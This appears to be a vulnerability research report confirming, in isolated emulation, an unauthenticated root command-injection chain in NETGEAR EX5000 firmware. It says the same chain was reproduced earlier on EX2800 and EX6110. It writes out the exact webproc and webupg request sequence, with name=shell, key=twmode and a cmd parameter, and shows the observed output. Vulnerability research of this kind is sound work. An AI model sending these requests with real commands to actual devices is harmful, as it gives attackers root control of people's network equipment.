# NETGEAR EX5000 V1.0.1.84 unauthenticated RCE confirmation

Date: 2026-07-24

## Result

The factory-unconfigured authentication-bypass and command-injection chain
previously confirmed in EX2800 and EX6110 firmware was reproduced end to end
using the official, distinct NETGEAR EX5000 V1.0.1.84 firmware image.

The harmless proof ran inside a disposable, privileged container with
`--network none`. No valid administrator credential or session was used.

Observed result:

```text
service_ready=true
unconfigured_state_present=true
setup_trigger_status=200
upgUnauth_created=true
webshell_status=200
upgUnauth_consumed=true
harmless_command_executed=true
command_output_reflected=true
webshell_component_execution=true
unauthenticated_rce_reproduced=true
```

The setup request supplied an invalid dummy session cookie and caused the
original EX5000 `webproc` to create the one-shot `/var/upgUnauth` marker.
The follow-on request reached the original EX5000 `webupg`, consumed the
marker, dispatched `name=shell`, accepted `key=twmode`, passed the harmless
attacker-controlled `cmd` value to `popen`, and reflected the command's unique
stdout token in the HTTP response.

## Isolated reproduction

The validated request sequence was:

```text
GET /cgi-bin/webproc?getpage=html/wizard_index.html&var:page=html/index_basic.htm
Cookie: sessionid=unconfigured-setup
```

followed by a request equivalent to:

```text
GET /cgi-bin/webupg?x=1&key=twmode&cmd=echo${IFS}FRIDAY_EX6110_RCE_VERIFIED&name=shell
Cookie: sessionid=component-check
```

The token name is inherited from the shared safe reproducer; it has no bearing
on the tested model. The reflected token proves execution rather than merely
reaching the CGI route.

## Emulation accommodations

The run used:

- the official EX5000 root filesystem and original Web-facing binaries;
- a previously documented `logic.emu` copy that bypasses unavailable
  MT7628 hardware initialization while preserving configuration and IPC;
- a narrowly scoped MTD-ioctl compatibility preload for `logic.emu`;
- the message-bus compatibility preload used by the existing EX2800 lab;
- a read-only `/proc/llconfig/model` fixture containing `EX5000`; and
- writable disposable runtime directories under `/var`.

No patch or compatibility preload modified `webproc`, `webupg`, or
`mini_httpd`.

The first EX5000 run returned HTTP 200 but the `webproc` child terminated
before creating `/var/upgUnauth`. The cause was that overlaying the official
root reset the disposable `/var` directory from mode 0777 to 0775 while the
emulated Web process ran under a different UID. Restoring the runtime
directory's intended lab writability produced the complete chain. This was an
emulation-permission false negative, not vulnerability evidence.

## Classification

- Authentication required: no valid administrator authentication.
- Required state: factory-unconfigured.
- Impact: arbitrary operating-system command execution as root.
- Confirmation: end-to-end official-firmware emulation.
- Exposure: primarily local/LAN setup and management networks.
- Default public-Internet/WAN exposure: not established.
- Physical EX5000 validation: not performed.
- Novelty: apparent zero-day family candidate; confidential prior reports
  cannot be excluded.

## Conclusion

NETGEAR EX5000 V1.0.1.84 is confirmed affected in isolated firmware
emulation. Together with the previous EX2800 and EX6110 confirmations, three
official product images now reproduce the same unauthenticated root-command
execution chain.
